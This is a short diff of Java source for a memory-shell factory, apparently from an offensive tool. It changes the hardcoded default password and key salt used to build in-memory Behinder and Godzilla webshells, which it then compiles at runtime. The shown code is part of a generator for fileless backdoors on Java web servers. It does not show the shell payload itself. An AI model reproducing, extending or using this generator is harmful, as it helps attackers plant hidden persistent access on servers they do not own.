@@ -34,7 +34,7 @@ public class MemroyFactory {
 
             /*生成连接密码*/
             if (password.equals("") || password.isEmpty()) {
-                password = "qax36oNb";
+                password = "passw0rd1024";
             }
             String md5 = CommonUtils.getMD5(password);
             String behinder = md5.substring(0, 16); //冰蝎密码
@@ -49,7 +49,7 @@ public class MemroyFactory {
             if (shellType.equals("Behinder")) {
                 format = String.format(implStr, implStrName, implStrName, behinder);
             } else if (shellType.equals("Godzilla")) {
-                format = String.format(implStr, implStrName, implStrName, password, CommonUtils.getMD5(password + "2f2e9f40c6d9fa47"));
+                format = String.format(implStr, implStrName, implStrName, password, CommonUtils.getMD5(password + "3ad85def8007425f"));
             }
             Map<String, byte[]> compile = javaStringCompiler.compile(implStrName + ".java", format);
             byte[] bytes = compile.get(implStrName);
